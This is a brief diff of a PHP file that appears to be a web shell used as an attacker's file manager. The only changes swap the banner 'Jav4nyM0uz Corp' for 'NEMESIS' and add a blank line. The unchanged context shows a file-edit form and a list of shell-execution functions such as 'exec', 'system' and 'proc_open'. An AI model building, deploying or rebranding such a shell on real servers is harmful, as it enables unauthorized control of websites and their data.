@@ -94,7 +94,7 @@ if (isset($_GET['edit'])) {
 </head>
 <body>
 <div class="glass">
-<h1 class="jx-title"><\> Jav4nyM0uz Corp <\></h1>
+<h1 class="jx-title"><\> NEMESIS <\></h1>
 <h2 style="font-family:Orbitron;color:#0095ff;text-shadow:0 0 6px #0077ff">Edit File: <?= htmlspecialchars($editFile) ?></h2>
 <form method="post">
 <textarea name="new_content"><?= $content ?></textarea><br>
@@ -197,7 +197,7 @@ $functions = ['exec','shell_exec','passthru','system','popen','proc_open'];
 </head>
 <body>
 
-<h1 class="jx-title"><\> Jav4nyM0uz Corp <\></h1>
+<h1 class="jx-title"><\> NEMESIS <\></h1>
 
 <div class="glass">
 <h3>Path: <?= htmlspecialchars($path) ?></h3>
@@ -253,4 +253,5 @@ foreach ($files as $file){
 </table>
 
 </body>
+
 </html>
